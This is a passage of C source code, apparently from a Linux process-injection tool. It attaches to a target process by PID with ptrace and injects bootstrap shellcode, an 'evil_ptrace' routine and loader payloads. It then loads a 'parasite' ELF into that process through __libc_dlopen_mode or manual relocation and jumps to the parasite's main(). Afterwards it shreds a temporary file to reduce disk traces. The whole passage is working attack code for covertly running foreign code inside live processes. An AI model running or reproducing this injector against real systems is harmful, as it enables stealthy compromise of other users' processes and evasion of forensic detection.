	DBG_MSG("[+] base (or highest address) of stack: %p\n", h->stack.base);
	
	if (pid_write(h->tasks.pid, (void *)h->remote.base, (void *)origcode, codesize) < 0) 
		return -1;
	
	/* bootstrap code now has created anonymous memory mapping to store 
	 * our loading code.
	 */
	
	return 0;
}	

/*
 * Allocates a buffer in which it stores the
 * bytecode for a function (Such as create_thread)
 */  
uint8_t * create_fn_shellcode(void (*fn)(), size_t len)
{
	size_t i;
	uint8_t *shellcode = (uint8_t *)heapAlloc(len);
	uint8_t *p = (uint8_t *)fn;

	for (i = 0; i < len; i++) 
		*(shellcode + i) = *p++;

	return shellcode;
	
}

Elf64_Addr randomize_base(void)
{	
	uint32_t v;
	uint32_t b;
	
	struct timeval tv;
	
	gettimeofday(&tv, NULL);
	srand(tv.tv_usec); 
	
	b = rand() % 0xF;
	b <<= 24;
	
	gettimeofday(&tv, NULL);
	srand(tv.tv_usec);

        v = _PAGE_ALIGN(b + (rand() & 0x0000ffff));
	
	return (uint64_t)v;
}


int map_elf_binary(handle_t *h,  const char *path)
{
	int fd, i, j;
	uint8_t *mem;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	Elf64_Sym  *sym;
	Elf64_Dyn *dyn;
	char *StringTable;
	
	if ((fd = open(path, O_RDWR)) < 0) {
		perror("open");
		return -1;
	}
	
	if ((h->path = strdup(path)) == NULL) {
		perror("strdup");
		return -1;
	}

	if (fstat(fd, &h->st) < 0) {
		perror("fstat");
		return -1;
	}

	mem = mmap(NULL, h->st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (mem == MAP_FAILED) {
		perror("mmap");
		return -1;
	}

	if (mem[0] != 0x7f && strcmp((char *)&mem[1], "ELF")) {
		printf("File %s is not an ELF executable\n", path);
		return -1;
	}

	h->mem = mem;
	h->ehdr = ehdr = (Elf64_Ehdr *)mem;
	h->phdr = phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	h->shdr = shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
	h->entryp = (void *)resolve_symbol("main", h->mem);
	printf("[+] Parasite entry point will be main(): %p\n", h->entryp);
	
	h->strtab = (char *)&mem[shdr[ehdr->e_shstrndx].sh_offset];
	
	for (i = 0; i < ehdr->e_phnum; i++) {
		switch(phdr[i].p_type) {		
			case PT_LOAD:
				switch (!!phdr[i].p_offset) {
					case 0:
						printf("[+] Found text segment\n");
						h->textVaddr = phdr[i].p_vaddr;
						h->textOff = phdr[i].p_offset;
						h->textSize = phdr[i].p_memsz;
						break;
					case 1:
						printf("[+] Found data segment\n");
						h->o_dataVaddr = h->dataVaddr = phdr[i].p_vaddr;
						h->dataOff = phdr[i].p_offset;
						h->dataSize = phdr[i].p_memsz;
						h->datafilesz = phdr[i].p_filesz;
						break;
				} 
				break;
			case PT_DYNAMIC:
				printf("[+] Found dynamic segment\n");
				h->dyn = dyn = (Elf64_Dyn *)&mem[phdr[i].p_offset];
				for (j = 0; dyn[j].d_tag != DT_NULL; j++) {
					switch(dyn[j].d_tag) {
						case DT_PLTGOT:
							printf("[+] Found G.O.T\n");
							h->gotVaddr = dyn[j].d_un.d_ptr;
							h->gotOff = dyn[j].d_un.d_ptr - h->dataVaddr;
							h->GOT = (Elf64_Addr *)&h->mem[h->dataOff + h->gotOff];
							break;
						case DT_PLTRELSZ:
							printf("[+] PLT count: %i entries\n", (int)dyn[j].d_un.d_val);
							h->pltSize = dyn[j].d_un.d_val / sizeof(Elf64_Rela);
							break;
						case DT_SYMTAB:
							printf("[+] Found dynamic symbol table\n");
							h->dsymVaddr = dyn[j].d_un.d_ptr;
							break;
						case DT_STRTAB:
							printf("[+] Found dynamic string table\n");
							h->dstrVaddr = dyn[j].d_un.d_ptr;
							break;
					}
				}
				break;
		}
	}
	//close(fd);
	return 0;

}

/*
 * This function prepares the initial calculations and
 * loads the shellcode necessary for RPPC (Remote process
 * procedure calls). These can be of type PT_SYSCALL or
 * PT_FUNCTION.
 */
	
void prepare_fn_payloads(payloads_t *payloads, handle_t *h)
{
	int i;

	for (i = 0; i < FUNCTION_PAYLOADS; i++) {
		switch(i) {
			case CREATE_THREAD:
				payloads->function[i].size = f12 - f11;
				payloads->function[i].shellcode = create_fn_shellcode((void *)&create_thread, payloads->function[i].size);	
				payloads->function[i].target = INIT_CODE_REGION;
				payloads->function[i].ptype = _PT_SYSCALL;
				payloads->function[i].args[0] = NULL;
				payloads->function[i].args[1] = NULL;
				payloads->function[i].args[2] = NULL;
				payloads->function[i].argc = 3;
				break;
			case EXEC_LOADER:
				payloads->function[i].size = f4 - f3;
				payloads->function[i].shellcode = create_fn_shellcode((void *)&load_exec, payloads->function[i].size);
				payloads->function[i].target = INIT_CODE_REGION;
				payloads->function[i].args[0] = (void *)NULL; // until we assign it h->path
				payloads->function[i].args[1] = (void *)(h->textVaddr += h->base);
				payloads->function[i].args[2] = (void *)(h->dataVaddr += h->base);
				payloads->function[i].args[3] = (void *)(uint64_t)h->textSize;
				payloads->function[i].args[4] = (void *)(uint64_t)h->dataSize;
				payloads->function[i].args[5] = (void *)(uint64_t)h->dataOff;
				payloads->function[i].argc = 6;	
				payloads->function[i].ptype = _PT_FUNCTION;
				break;
			case DLOPEN_EXEC_LOADER:
				payloads->function[i].size = f3 - f2;
				payloads->function[i].shellcode = create_fn_shellcode((void *)&dlopen_load_exec, payloads->function[i].size);
				payloads->function[i].target = INIT_CODE_REGION;
				payloads->function[i].args[0] = (void *)NULL; // until we assign it h->path;
				payloads->function[i].args[1] = (void *)get_sym_from_libc(h, "__libc_dlopen_mode");
				payloads->function[i].argc = 2;
				break;
			case EVIL_PTRACE: /* UNUSED AS REMOTE FUNCTION */
			        payloads->function[i].size = f10 - f9;
				payloads->function[i].shellcode = create_fn_shellcode((void *)&evil_ptrace, payloads->function[i].size);
				payloads->function[i].target = 0;
				break;	
			case BOOTSTRAP_CODE:
				payloads->function[i].size = f2 - f1;
				payloads->function[i].shellcode = create_fn_shellcode((void *)&bootstrap_code, payloads->function[i].size);
				payloads->function[i].target = 0;
				payloads->function[i].args[0] = (void *)INIT_CODE_REGION;
				payloads->function[i].args[1] = (void *)payloads->function[CREATE_THREAD].size +
									payloads->function[EXEC_LOADER].size + 
									payloads->function[EVIL_PTRACE].size + 
									payloads->function[BOOTSTRAP_CODE].size;
				payloads->function[i].args[2] = (void *)randomize_base();
				payloads->function[i].argc = 3;
				payloads->function[i].ptype = _PT_FUNCTION;
				break;
			case SYS_MPROTECT:
				payloads->function[i].size = f13 - f12;
				payloads->function[i].shellcode = create_fn_shellcode((void *)&SYS_mprotect, payloads->function[i].size);
				payloads->function[i].target = INIT_CODE_REGION;
				payloads->function[i].args[0] = NULL;
				payloads->function[i].args[1] = NULL;
				payloads->function[i].args[2] = NULL;
				payloads->function[i].argc = 3;
				payloads->function[i].ptype = _PT_FUNCTION;
				break;
		}
	}
}

char * get_section_index(int section, uint8_t *target)
{
        
        int i;
        Elf64_Ehdr *ehdr = (Elf64_Ehdr *)target;
        Elf64_Shdr *shdr = (Elf64_Shdr *)(target + ehdr->e_shoff);
        
        for (i = 0; i < ehdr->e_shnum; i++) {
                if (i == section)
                        return (target + shdr[i].sh_offset);
        }

}

unsigned long get_libc_addr(int pid)
{
        FILE *fd;
        char buf[255], file[255];
        char *p, *q;
        Elf64_Addr start, stop;

        snprintf(file, sizeof(file)-1, "/proc/%d/maps", pid);
        
        if ((fd = fopen(file, "r")) == NULL) {
                printf("fopen %s: %s\n", file, strerror(errno));
                exit(-1);
        }
        
        while (fgets(buf, sizeof(buf), fd)) {
                if (strstr(buf, "libc") && strstr(buf, ".so")) {
                        if ((p = strchr(buf, '-'))) 
                                *p = '\0';
                        
                        start = strtoul(buf, NULL, 16);
                        p++;
                        stop = strtoul(p, NULL, 16);
                        
                        globals.libc_vma_size = stop - start;
                        /* While we're at it get the path too */
                        while (*p != '/')
                                p++;
                        *(char *)strchr(p, '\n') = '\0';
                        globals.libc_path = strdup(p);
                        if (!globals.libc_path) {
                                perror("strdup");
                                exit(-1);
                        }
                        globals.libc_addr = start;
                        return start;
                }
        }

}

Elf64_Addr get_sym_from_libc(handle_t *h, const char *name)
{
	int fd, i;
	struct stat st;
	Elf64_Addr libc_base_addr = get_libc_addr(h->tasks.pid);
	Elf64_Addr symaddr;
	
	if ((fd = open(globals.libc_path, O_RDONLY)) < 0) {
		perror("open libc");
		exit(-1);
	}
	
	if (fstat(fd, &st) < 0) {
		perror("fstat libc");
		exit(-1);
	}
	
	uint8_t *libcp = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (libcp == MAP_FAILED) {
		perror("mmap libc");
		exit(-1);
	}
	
	symaddr = resolve_symbol((char *)name, libcp);
	if (symaddr == 0) {
		printf("[!] resolve_symbol failed for symbol '%s'\n", name);
		printf("Try using --manual-elf-loading option\n");
		exit(-1);
	}
	symaddr = symaddr + globals.libc_addr; 

	DBG_MSG("[DEBUG]-> get_sym_from_libc() addr of __libc_dl_*: %lx\n", symaddr);
	return symaddr;

}
/*
 * Resolve libc symbols using computation:
 * symval = B + A
 */
int fixup_got(handle_t *h)
{
        int i, slot;
        struct linking_info *link;
        Elf64_Addr got_sym_addr, symaddr;
        Elf64_Addr libc_addr, tmp;
        unsigned int libc_sym_addr;
        
        h->linfo = link = (struct linking_info *)(uintptr_t)get_reloc_data(h);
        if (!link) {
                printf("Unable to resolve Global offset table symbols\n");
                exit(-1);
        }

        get_libc_addr(h->tasks.pid);

        int fd;
        struct stat st;

        if ((fd = open(globals.libc_path, O_RDONLY)) < 0) {
                perror("open libc");
                exit(-1);
        }

        if (fstat(fd, &st) < 0) {
                perror("fstat");
                exit(-1);
        }
        
        /*
         * Map libc into memory, and resolve its symbols.
         */
        uint8_t *libcp = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
        for (slot = 0, i = 0; i < link[0].count; i++) {
                if (link[i].r_type != R_X86_64_JUMP_SLOT)
                        continue;
		slot++;
                libc_sym_addr = resolve_symbol(link[i].name, libcp);
                tmp = libc_sym_addr + globals.libc_addr;
                printf("[+] FUNC %s -> Assigning value %lx to GOT(%lx)\n", link[i].name, tmp, h->gotVaddr + ((slot + 2) * sizeof(void *)));
		h->GOT[slot + 2] = tmp;
		link[i].gotOffset = h->gotOff + ((slot + 2) * sizeof(void *));
		link[i].resolved = tmp;
        }                               
	
	munmap(libcp, st.st_size);       
        close(fd);

        return 0;
}

Elf64_Addr resolve_symbol(char *name, uint8_t *target)
{
        Elf64_Sym *symtab;
        char *SymStrTable;
        int i, j, symcount;

        Elf64_Off strtab_off;
        Elf64_Ehdr *ehdr = (Elf64_Ehdr *)target;
        Elf64_Shdr *shdr = (Elf64_Shdr *)(target + ehdr->e_shoff);

        for (i = 0; i < ehdr->e_shnum; i++) {
                if (shdr[i].sh_type == SHT_SYMTAB || shdr[i].sh_type == SHT_DYNSYM) {
                        /* 
                         * In this instance of the sh_link member of Elf64_Shdr, it points
                         * to the section header index of the symbol table string table section.
                         */
                        SymStrTable = (char *)get_section_index(shdr[i].sh_link, target);
                        symtab = (Elf64_Sym *)get_section_index(i, target);
                        for (j = 0; j < shdr[i].sh_size / sizeof(Elf64_Sym); j++, symtab++) {
                                if(strcmp(&SymStrTable[symtab->st_name], name) == 0) {
                                        return (symtab->st_value);
                                }
                        }
                }
        }
        return 0;
} 

/*
 * This function retrieves data from X86_64_JUMP_SLOT
 * relocation types. (GOT entries for dynamic linking)
 */
struct linking_info *get_reloc_data(handle_t *target)
{
        Elf64_Shdr *shdr, *shdrp, *symshdr;
        Elf64_Sym *syms, *symsp;
        Elf64_Rel *rel;
	Elf64_Rela *rela;
        Elf64_Ehdr *ehdr;

        char *symbol;
        int i, j, symcount, k;

        struct linking_info *link;

        uint8_t *mem = (uint8_t *)target->mem;

        ehdr = (Elf64_Ehdr *)mem;
        shdr = (Elf64_Shdr *)(mem + ehdr->e_shoff);

        shdrp = shdr;

        for (i = ehdr->e_shnum; i-- > 0; shdrp++) {
                if (shdrp->sh_type == SHT_DYNSYM) {
                        symshdr = &shdr[shdrp->sh_link];
                        if ((symbol = malloc(symshdr->sh_size)) == NULL)
                                goto fatal;
                        memcpy(symbol, (mem + symshdr->sh_offset), symshdr->sh_size);

                        if ((syms = (Elf64_Sym *)malloc(shdrp->sh_size)) == NULL)
                                goto fatal;

                        memcpy((Elf64_Sym *)syms, (Elf64_Sym *)(mem + shdrp->sh_offset), shdrp->sh_size);
                        symsp = syms;

                        symcount = (shdrp->sh_size / sizeof(Elf64_Sym));
                        link = (struct linking_info *)malloc(sizeof(struct linking_info) * symcount);
                        if (!link)
                                goto fatal;
                        link[0].count = symcount;
                        for (j = 0; j < symcount; j++, symsp++) {
                                link[j].name = strdup(&symbol[symsp->st_name]);
                                if (!link[j].name)
                                        goto fatal;
                                link[j].s_value = symsp->st_value;
                                link[j].index = j;
                        }
                        break;
   		}
        }
        for (i = ehdr->e_shnum; i-- > 0; shdr++) {
                switch(shdr->sh_type) {
                        case SHT_RELA:
                                 rela = (Elf64_Rela *)(mem + shdr->sh_offset);
                                 for (j = 0; j < shdr->sh_size; j += sizeof(Elf64_Rela), rela++) {
                                        for (k = 0; k < symcount; k++) {
                                                if (ELF64_R_SYM(rela->r_info) == link[k].index) {
                                                        link[k].r_offset = rela->r_offset;
                                                        link[k].r_info = rela->r_info;
                                                        link[k].r_type = ELF64_R_TYPE(rela->r_info);
                                                }

                                        }
                                 }
                                 break;
                        case SHT_REL:
				 rel = (Elf64_Rel *)(mem + shdr->sh_offset);
                                 for (j = 0; j < shdr->sh_size; j += sizeof(Elf64_Rel), rel++) {
                                        for (k = 0; k < symcount; k++) {
                                                if (ELF64_R_SYM(rel->r_info) == link[k].index) {
                                                        link[k].r_offset = rel->r_offset;
                                                        link[k].r_info = rel->r_info;
                                                        link[k].r_type = ELF64_R_TYPE(rel->r_info);
                                                }

                                        }
                                 }

                                break;

                        default:
                                break;
                }
        }

        return link;
        fatal:
                return NULL;
}

/*
 * Apply ELF relocations of type RELATIVE and GLOBAL_DAT
 */
int apply_relocs(handle_t *h)
{ 
	int i, j, k;
	Elf64_Shdr *shdr, *targetShdr;
	Elf64_Rela *rel;
	struct linking_info *linfo = h->linfo;
	Elf64_Sym *symtab, *symbol;
	Elf64_Addr targetAddr, symval;
	Elf64_Addr *relocPtr;
	int dynstr;
	char *StringTable;
		
	for (shdr = h->shdr, i = 0; i < h->ehdr->e_shnum; i++)
		if (shdr[i].sh_type == SHT_STRTAB && i != h->ehdr->e_shstrndx) {
			dynstr = i;
			break;
		}
	
	StringTable = (char *)&h->mem[shdr[dynstr].sh_offset];

	for (shdr = h->shdr, i = 0; i < h->ehdr->e_shnum; i++) {
		if (shdr[i].sh_type == SHT_RELA) {
			rel = (Elf64_Rela *)&h->mem[shdr[i].sh_offset];
			for (j = 0; j < shdr[i].sh_size / sizeof(Elf64_Rela); j++, rel++) {
				switch(ELF64_R_TYPE(rel->r_info)) {

					case R_X86_64_GLOB_DAT:

						/* 
						 * We actually can leave this reloc type alone because
						 * we start executing the parasite at main() and not
						 * _start(), so we can ignore these ones that are
						 * necessary for initialization.
						 */
						continue;
						/*
				 		 * We must resolve this relocation type
						 * relval = S
						 */
						
						relocPtr = (Elf64_Addr *)(h->mem + h->dataOff + (rel->r_offset - h->o_dataVaddr));
				        	symtab = (Elf64_Sym *)&h->mem[h->shdr[h->shdr[i].sh_link].sh_offset];
                                        	symbol = (Elf64_Sym *)&symtab[ELF64_R_SYM(rel->r_info)];
                                        	if (symbol->st_shndx > h->ehdr->e_shnum) //bug workaround
                                                	continue;
						for (k = 0; k < linfo[0].count; k++) {
							if (!strcmp(&StringTable[symbol->st_name], linfo[k].name)) {
								*(uint64_t *)relocPtr = linfo[k].resolved;	
								break;
							}
						} 
						break;
					case R_X86_64_RELATIVE:
						
						/*
						 * We must resolve this relocation type baby!
						 * relval = B + A
						 */
						relocPtr = (Elf64_Addr *)(h->mem + h->dataOff + (rel->r_offset - h->o_dataVaddr));
						symval = h->base + rel->r_addend;
						*(uint64_t *)relocPtr = symval;
						
						DBG_MSG("[DEBUG]: R_X86_64_RELATIVE relocation unit given value: %lx\n", symval);
						break;
					case R_X86_64_64:
						/*
						 * We must resolve this relocation type baby!
						 * relval = S + A
						 */
						relocPtr = (Elf64_Addr *)(h->mem + h->dataOff + (rel->r_offset - h->o_dataVaddr));
						
						/*
						 * Get associated symbol and its value.
						 */
						symtab = (Elf64_Sym *)&h->mem[h->shdr[h->shdr[i].sh_link].sh_offset];
						symbol = (Elf64_Sym *)&symtab[ELF64_R_SYM(rel->r_info)];
						symval = symbol->st_value;
						symval += h->base;
						symval += rel->r_addend;
						
						/*	
						 * Fixup relocation unit
						 */
						*(uint64_t *)relocPtr = symval;
						
						DBG_MSG("DEBUG R_X86_64_64 relocation computed to %lx\n", symval);
						break;
				} 
			}
		}
	}

}


int apply_elf_relocations(handle_t *h)
{
	
	/*
	 * This handles the dynamic linking:
	 * we bind the parasites dynamic functions
	 * to the libc symbols mapped into the
	 * hosts memory space.
	 * So handle relocs of type R_X86_64_JUMP_SLOT
	 */
#if DEBUG
	printf("[DEBUG] Calling fixup_got()\n");
#endif
	if (fixup_got(h) < 0) {
                printf("Failed to handle libc resolution\n");
                return -1;
        }
 	
	/* 
	 * Handle relocs of R_X86_64_GLOB_DAT, R_X86_64_RELATIVE, R_X86_64_64
	 */
#if DEBUG
	printf("[DEBUG] Calling apply_relocs()\n");
#endif
	
	if (apply_relocs(h) < 0) {
		printf("Failed to handle R_X86_64_GLOB_DAT relocation types\n");
		return -1;
	}
	

	return 0;
}

static uint64_t get_parasite_entry(handle_t *h)
{
	FILE *fd;
	char buf[256], *p, *basename;
	Elf64_Addr entry = 0;
	char path[256];

	snprintf(path, sizeof(path) - 1, "/proc/%d/maps", h->tasks.pid);
	if ((fd = fopen(path, "r")) == NULL) {
		perror("fopen");
		exit(-1);
	}
	
	if ((p = strrchr(h->path, '/')) != NULL) 
		basename = strdup(p + 1);	
	else
		basename = strdup(h->path);
	
	DBG_MSG("[DEBUG] -> parasite basename: %s\n", basename);

	while (fgets(buf, sizeof(buf), fd)) {
		if (strstr(buf, basename)) {
			if (strstr(buf, "r-xp")) {
				*(char *)strchr(buf, '\0') = '\0';
				p = buf;
				entry = strtoul(p, NULL, 16);
				break;
			}
		}
	}
	fclose(fd);				
	return entry;
}

static int write_to_disk(handle_t *h)
{
	int fd;

	unlink(TMP_PATH);

	fd = open(TMP_PATH, O_RDWR|O_CREAT|O_TRUNC);
	if (fd < 0) {
		perror("write_to_disk: open");
		return -1;
	}
	if (write(fd, h->mem, h->st.st_size) != h->st.st_size) {
		perror("write_to_disk: write");
		return -1;
	}

	close(fd);
	return 0;
}

void exec_cmd (char *str, ...)
{
        char string[1024];
        va_list va;

        va_start (va, str);
        vsnprintf (string, 1024, str, va);
        va_end (va);
        system (string);
}
	
int main(int argc, char **argv)
{
	handle_t parasite;
	int (*run_exec_loader_fn)(handle_t *) = run_exec_loader_dlopen; //default mode is to use dlopen
	int (*launch_parasite_fn)(handle_t *) = dlopen_launch_parasite; //default mode is to use dlopen

	char **args, **pargs;
	int target_argc;
	int i;

	if (argc < 3) {
		printf("Usage: %s [--no-dlopen] <pid> <parasite> <parasite_args>\n", argv[0]);
		exit(0);
	}
	
	opts.no_dlopen = 0;
	
	args = &argv[1];
	target_argc = argc - 2;  
	/*
	 * target_argc should be how many args from ./parasite program
 	 * including the program name itself and any args after it.
 	 * I.E ./parasite <arg1> <arg2> would be target_argc 3
	 */
	if (!strcmp(argv[1], "--no-dlopen")) {
		opts.no_dlopen = 1;
		args = &argv[2];
		target_argc = argc - 3;
	}
	
	arginfo.argc = target_argc;
	
	printf("Parasite command: ");
	for (i = 0, pargs = &args[1]; i < target_argc; i++) {
		arginfo.args[i] = strdup(pargs[i]);
		printf("%s ", arginfo.args[i]);
	}
	printf("\n");

	parasite.tasks.pid = atoi(args[0]);
	printf("[+] Target pid: %d\n", parasite.tasks.pid);

	if (opts.no_dlopen) {
	printf("Calling randomize base\n");
	parasite.base = randomize_base();
	do {
		parasite.base = randomize_base();
	} 	while(parasite.base == 0);
		printf("[+] Using base %lx\n", parasite.base);

	}
	printf("[+] map_elf_binary(ptr, %s)\n", args[1]);
	if (map_elf_binary(&parasite, args[1]) < 0) {
		printf("Unable to load: %s\n", args[1]);
		exit(-1);
	}
	
	prepare_fn_payloads(&parasite.payloads, &parasite);
	
	if (opts.no_dlopen) {
		printf("[+] Applying ELF relocations manually\n");
		if (apply_elf_relocations(&parasite) < 0) {
			printf("Failed to apply relocations\n");
			exit(-1);
		}
	} 

	/*
	 * Write a relocated version of parasite executable
	 * to disk /tmp/.parasite.elf. This is the version
	 * of our parasite executable that will be loaded into memory.
	 * since it has relocation information applied.
	 */

	if (opts.no_dlopen) {
		printf("[+] Writing temporary relocated version of file (FIXME, TOUCHES DISK IN EXTRA PLACE)\n");
		if (write_to_disk(&parasite) < 0) {
			printf("[!] Unable to write relocated parasite to temporary location\n");
			goto done;
		}
	}


	if (pid_attach(&parasite) < 0) 
		goto done;
	
	printf("[+] calling bootstrap\n");
	
	if (backup_regs_struct(&parasite) < 0)
		goto done;

	/* 	
	 * Inject and execute bootstrap_code()
	 */
	run_bootstrap(&parasite);
	
	printf("[+] calling exec_loader\n");
	/*
	 * Inject and execute load_exec()
	 */
	if (opts.no_dlopen) {
		printf("[+] manual elf exec_loader\n");
		run_exec_loader_fn = run_exec_loader;
	} else
		printf("[+] dlopen elf exec_loader\n");
	
	run_exec_loader_fn(&parasite);

#if DEBUG
	system("pmap `pidof host`");
#endif
	
	if (opts.no_dlopen == 0) {
		uint64_t entrypoint = get_parasite_entry(&parasite);
		if (entrypoint == 0) {
			printf("get_parasite_entry() failed\n");
			goto done;
		}
		entrypoint += (uint64_t)parasite.entryp;
		parasite.entryp = (void *)entrypoint;
	}

	/*
	 * Pass control to parasite
	 */
	printf("[+] calling launch_parasite()\n");
	
	if (opts.no_dlopen) 
		launch_parasite_fn = launch_parasite;

	if (launch_parasite_fn(&parasite) < 0)
		goto done;
	
	if (restore_regs_struct(&parasite) < 0) 
		goto done;
	
	if (pid_detach_stateful(&parasite) < 0)
		goto done;

	kill(parasite.tasks.pid, SIGCONT);
	
done:
	if (access(TMP_PATH, F_OK) == 0) {
		exec_cmd("shred %s", TMP_PATH);
		if (access(TMP_PATH, F_OK) == 0)
			exec_cmd("rm %s", TMP_PATH);
	}

	exit(0);
	
}
